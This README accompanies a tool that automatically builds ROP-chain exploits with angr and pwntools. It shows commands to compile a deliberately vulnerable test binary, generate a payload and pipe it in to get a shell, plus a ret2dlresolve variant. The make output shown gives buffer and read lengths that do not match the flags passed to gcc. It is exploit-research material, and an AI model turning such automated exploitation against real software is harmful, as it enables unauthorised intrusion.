This is the accompanying code to the blog post talking about 
automated rop chain generation.

Build the test file with:
```
make
```

Install the dependencies:
```
pip3 install pwntools angr
```

Run the rop chain generator:
```
./auto_rop_chain.py ./buffer_overflow_64bit
```

Verify it works:
```
# You will need to hit enter twice, since angr didn't add
# a new line to the pwn input.
$ cat ./pwn_input - | ./buffer_overflow_64bit
pwn_me:
Your buffer is at 0x7fffffffd910

ls
Makefile  auto_rop_chain.py  buffer_overflow.c  buffer_overflow_64bit  pwn_input  readme.md
```

## ret2dlresolve solver

Note that the make target will generate a binary with
a random buffer length and read length.
```
$ make dlresolve
--- Random buffer length is 40 ---
--- Random read length is 170 ---
gcc -fno-stack-protector -no-pie \
buffer_overflow_dlresolve.c \
-o buffer_overflow_64bit_dlresolve \
-Wno-nonnull \
-DRAND_BUF_LEN=54 \
-DRAND_READ_LEN=177
```
The rop chain generator will still make short work of it:
```
python auto_rop_chain_dlresolv.py ./buffer_overflow_64bit_dlresolve
```

[![asciicast](https://asciinema.org/a/463780.svg)](https://asciinema.org/a/463780)